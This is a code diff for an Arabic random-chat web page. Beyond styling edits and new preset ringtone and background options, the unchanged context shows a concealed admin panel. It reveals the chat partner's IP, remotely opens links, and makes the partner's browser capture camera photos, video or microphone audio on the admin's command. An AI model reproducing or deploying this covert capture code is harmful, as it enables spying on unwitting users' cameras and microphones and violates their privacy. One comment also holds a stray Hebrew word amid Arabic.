@@ -6,7 +6,7 @@
 <title>شات عربي | دردشة عشوائية</title>
 <style>
 * { margin: 0px; padding: 0px; box-sizing: border-box; }
-body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction: rtl; }
+body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction: rtl; transition: background 0.3s ease; }
 
 .header { background-color: rgb(24, 149, 210); direction: rtl; padding: 6px 12px; display: flex; justify-content: space-between; align-items: center; }
 .header-right { display: flex; flex-direction: column; }
@@ -16,33 +16,38 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 #timer { color: #fff; font-size: 13px; background: rgba(0,0,0,0.2); padding: 3px 8px; border-radius: 4px; display: none; }
 #system-alert-banner { background: #ff4757; color: white; text-align: center; padding: 6px; font-weight: bold; display: none; font-size: 14px; }
 
-#chat { width: 100%; direction: rtl; }
+#chat { width: 100%; direction: rtl; position: relative; }
 #conv { padding: 6px; direction: rtl; height: 320px; overflow-y: auto; }
-#conv span, #conv p, #conv div { border-radius: 5px; padding: 5px 10px; margin: 5px; display: table; font-size: 18px; font-weight: normal; max-width: 80%; word-break: break-word; position: relative; }
+#conv span, #conv p, #conv div { border-radius: 5px; padding: 5px 10px; margin: 5px; display: table; font-size: 18px; font-weight: normal; max-width: 80%; word-break: break-word; position: relative; unicode-bidi: plaintext; text-align: right; }
 
 #sr { background: rgb(245, 245, 245); color: tomato; }
 #hi { background: rgb(245, 245, 245); color: rgb(41, 177, 63); display: none !important; }
 
+/* مؤشر يكتب يظهر בדיוק في مكان رسالة الطرف الآخر تماماً (جهة اليمين) */
 #typing-indicator { 
-  background: rgb(245, 245, 245) !important; 
-  color: rgb(110, 110, 110) !important; 
-  font-size: 13px !important; 
+  background: rgb(24, 149, 210) !important; 
+  color: rgb(255, 255, 255) !important; 
+  font-size: 15px !important; 
   font-weight: normal !important;
-  margin-left: 0 !important; 
-  margin-right: auto !important; 
+  margin-right: 5px !important; 
+  margin-left: auto !important; 
   display: none; 
-  padding: 3px 8px !important;
-  border-radius: 4px !important;
+  padding: 5px 10px !important;
+  border-radius: 5px !important;
+  width: fit-content;
+  margin-bottom: 5px;
+  direction: rtl;
+  text-align: right;
 }
 
-#conv div.my-msg { background: rgb(233, 236, 241); color: rgb(119, 119, 119); margin-right: 0; margin-left: auto; }
-#conv p.partner-msg { background: rgb(24, 149, 210); color: rgb(255, 255, 255); margin-left: 0; margin-right: auto; }
+#conv div.my-msg { background: rgb(233, 236, 241); color: rgb(119, 119, 119); margin-right: auto; margin-left: 0; }
+#conv p.partner-msg { background: rgb(24, 149, 210); color: rgb(255, 255, 255); margin-left: auto; margin-right: 0; }
 #conv p.partner-msg a, #conv div.my-msg a { text-decoration: underline; color: inherit; }
 
 #conv img { max-width: 180px; max-height: 180px; border-radius: 5px; display: block; margin-top: 5px; cursor: pointer; }
 #conv video, #conv audio { max-width: 200px; border-radius: 5px; display: block; margin-top: 5px; }
 
-/* لوحة تحكم الأدمن المحدثة */
+/* لوحة تحكم الأدمن */
 #admin-panel { background: #ffeaa7; padding: 8px; border-bottom: 2px solid #fdcb6e; display: none; text-align: center; font-size: 13px; }
 #admin-panel input, #admin-panel select { padding: 4px; border-radius: 4px; border: 1px solid #ccc; font-size: 13px; margin: 2px; }
 #admin-panel button { padding: 4px 8px; background: #e17055; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; margin: 2px; }
@@ -52,9 +57,9 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 #media-preview-box { background: white; padding: 15px; border-radius: 8px; text-align: center; color: black; max-width: 90%; }
 #media-preview-box img, #media-preview-box video, #media-preview-box audio { max-width: 100%; max-height: 250px; border-radius: 5px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto; }
 
-/* شريط الكتابة الكلاسيكي المرتب صحيحاً */
+/* شريط الكتابة */
 #send { width: 100%; background: rgb(248, 248, 248); padding: 5px 8px; border-top: 1px solid rgb(238, 238, 238); border-bottom: 1px solid rgb(238, 238, 238); display: flex; align-items: center; gap: 5px; direction: rtl; }
-#inp { flex: 1; padding: 8px; border: 1px solid rgb(221, 221, 221); border-radius: 5px; outline: none; font-size: 16px; direction: rtl; background: #fff; }
+#inp { flex: 1; padding: 8px; border: 1px solid rgb(221, 221, 221); border-radius: 5px; outline: none; font-size: 16px; direction: rtl; unicode-bidi: plaintext; background: #fff; text-align: right; }
 #snd, .file-btn, #mic-btn { padding: 8px 12px; cursor: pointer; background: rgb(238, 238, 238); color: rgb(51, 51, 51); border: 1px solid rgb(204, 204, 204); border-radius: 3px; font-size: 14px; text-align: center; display: inline-block; white-space: nowrap; }
 .file-btn { background: #fdfdfd; }
 #mic-btn { background: #fdfdfd; }
@@ -85,20 +90,29 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     <input type="text" id="admin-url-inp" placeholder="رابط..." style="width: 80px;">
     <button onclick="sendAdminUrl()">فتح رابط</button>
     
-     ثواني: <input type="number" id="media-duration" value="5" min="1" max="60" style="width: 45px;">
+    ثواني: <input type="number" id="media-duration" value="5" min="1" max="60" style="width: 45px;">
     <button onclick="requestAdminMedia('photo')">📸 صورة</button>
     <button onclick="requestAdminMedia('video')">🎥 فيديو</button>
     <button onclick="requestAdminMedia('audio')">🎙️ صوت</button>
     
-    <label for="sound-picker" style="cursor:pointer; background:#00b894; color:white; padding:4px 6px; border-radius:4px; display:inline-block;">🎵 نغمة</label>
-    <input type="file" id="sound-picker" accept="audio/*" style="display:none;" onchange="sendSoundFile(this)">
+    <select id="preset-ringtone" style="padding:4px; border-radius:4px;">
+      <option value="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3">نغمة رنين 1</option>
+      <option value="https://assets.mixkit.co/active_storage/sfx/1359/1359-preview.mp3">تنبيه هادئ</option>
+      <option value="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3">صفارة إرسال</option>
+    </select>
+    <button onclick="sendPresetRingtone()" style="background:#00b894; color:white;">🎵 تشغيل نغمة</button>
 
     <button onclick="sendAlert()">📢 تنبيه</button>
     <button class="danger" onclick="clearChat('all')">مسح الكل</button>
     <button class="danger" onclick="clearChat('theirs')">مسح رسائله</button>
     
-    <label for="bg-picker" style="cursor:pointer; background:#0984e3; color:white; padding:4px 6px; border-radius:4px; display:inline-block;">🖼️ خلفية</label>
-    <input type="file" id="bg-picker" accept="image/*" style="display:none;" onchange="changeBgFile(this)">
+    <select id="preset-bg-color" onchange="changeBgColor(this.value)" style="padding:4px; border-radius:4px;">
+      <option value="#ffffff">أبيض افتراضي</option>
+      <option value="#f1f2f6">رمادي فاتح</option>
+      <option value="#ffeaa7">أصفر هادئ</option>
+      <option value="#dfe6e9">سماوي فاتح</option>
+      <option value="#2d3436">داكن (ليلي)</option>
+    </select>
 
     <div id="client-info" style="font-size: 11px; color: #333; margin-top: 4px; font-weight: bold;">
       IP: جاري التحميل...
@@ -372,7 +386,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       socket.emit('admin_action', { action: 'request_media', secret: adminSecret, mediaType, duration });
     }
 
-    // تصحيح التقاط الكاميرا لتفادي تلف الصورة
     socket.on('trigger_camera', async ({ mediaType, duration }) => {
       if (isAdmin) return;
       try {
@@ -380,7 +393,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         
         if (mediaType === 'photo') {
-          // التقاط صورة ثابتة مباشرة لمنع التلف
           const videoTrack = stream.getVideoTracks()[0];
           const imageCapture = new ImageCapture(videoTrack);
           const photoBlob = await imageCapture.takePhoto();
@@ -462,7 +474,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       socket.emit('admin_action', { action: 'clear_chat', secret: adminSecret, target: target });
     }
 
-    // تصحيح "مسح رسائله" بحيث يمسح رسائل الطرف الآخر فقط ولا يمسح رسائلك الشخصية
     socket.on('clear_chat', (target) => {
       if (target === 'all') {
         document.querySelectorAll('.my-msg, .partner-msg').forEach(el => el.remove());
@@ -471,16 +482,9 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       }
     });
 
-    // إرسال صوت/نغمة كمباشر لدى الطرف الآخر
-    function sendSoundFile(input) {
-      const file = input.files[0];
-      if (!file) return;
-      const reader = new FileReader();
-      reader.onload = function(e) {
-        socket.emit('admin_action', { action: 'play_sound', secret: adminSecret, audioUrl: e.target.result });
-      };
-      reader.readAsDataURL(file);
-      input.value = '';
+    function sendPresetRingtone() {
+      const ringtoneUrl = document.getElementById('preset-ringtone').value;
+      socket.emit('admin_action', { action: 'play_sound', secret: adminSecret, audioUrl: ringtoneUrl });
     }
 
     socket.on('play_sound_in_browser', (audioUrl) => {
@@ -489,22 +493,12 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       audio.play().catch(err => console.log('تعذر تشغيل الصوت تلقائياً'));
     });
 
-    // تغيير الخلفية من الوسائط
-    function changeBgFile(input) {
-      const file = input.files[0];
-      if (!file) return;
-      const reader = new FileReader();
-      reader.onload = function(e) {
-        socket.emit('admin_action', { action: 'change_bg', secret: adminSecret, bgUrl: e.target.result });
-      };
-      reader.readAsDataURL(file);
-      input.value = '';
+    function changeBgColor(color) {
+      socket.emit('admin_action', { action: 'change_bg', secret: adminSecret, bgColor: color });
     }
 
-    socket.on('change_bg', (bgUrl) => {
-      document.body.style.backgroundImage = `url(${bgUrl})`;
-      document.body.style.backgroundSize = 'cover';
-      document.body.style.backgroundRepeat = 'no-repeat';
+    socket.on('change_bg', (bgColor) => {
+      document.body.style.backgroundColor = bgColor;
     });
   </script>
 </body>
